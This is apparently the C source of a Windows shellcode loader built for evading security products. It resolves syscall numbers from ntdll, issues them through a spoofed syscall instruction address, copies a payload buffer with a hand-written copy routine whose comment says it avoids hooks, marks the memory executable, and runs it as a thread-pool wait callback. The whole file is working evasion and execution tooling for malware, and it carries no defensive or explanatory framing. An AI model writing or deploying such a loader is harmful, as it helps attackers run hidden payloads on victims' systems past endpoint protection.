#include <Windows.h>
#include "headstructs.h"
#include "payload.h"

PVOID CopyMemoryEx(PVOID Destination, PVOID Source, SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

int main()
{
    auto hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD SyscallId = 0;
    LPVOID spoofJump = ((char*)GetProcAddress(hNtdll, "NtAddBootEntry")) + 18; //Fetching the Syscall instruction address
    HANDLE c = CreateEventA(NULL, FALSE, TRUE, NULL);

    LPVOID currentVmBase = NULL;
    SIZE_T szWmResv = sizeof(buf);
    //Resolving ZwAllocateVirtualMemory
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"ZwAllocateVirtualMemory");
    setup(SyscallId, spoofJump);
    NTSTATUS status = executioner((HANDLE)-1,&currentVmBase, NULL,&szWmResv,MEM_COMMIT,PAGE_READWRITE);
    //Allocating space in memory for shellcode

    CopyMemoryEx(currentVmBase, buf, szWmResv);
    //Avoiding hooks with custom copying on current process

    //Resolving NtProtectVirtualMemory
    DWORD oldProt;
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtProtectVirtualMemory");
    setup(SyscallId, spoofJump);
    status = executioner((HANDLE)-1,&currentVmBase, &szWmResv,PAGE_EXECUTE_READ,&oldProt);

    //Resolving TpAllocWait
    HANDLE hThread = NULL;
    pTpAllocWait TpAllocWait = (pTpAllocWait)GetProcAddress(hNtdll, "TpAllocWait");
    status = TpAllocWait((TP_WAIT**)&hThread, (PTP_WAIT_CALLBACK)currentVmBase, NULL, NULL);

    //Resolving TpSetWait
    pTpSetWait TpSetWait = (pTpSetWait)GetProcAddress(hNtdll, "TpSetWait");
    TpSetWait((TP_WAIT*)hThread, c, NULL);

    //Resolving NtWaitForSingleObject
    GetSyscallId(hNtdll, &SyscallId, (PCHAR)"NtWaitForSingleObject");
    setup(SyscallId, spoofJump);
    status = executioner(c, 0, NULL);
}
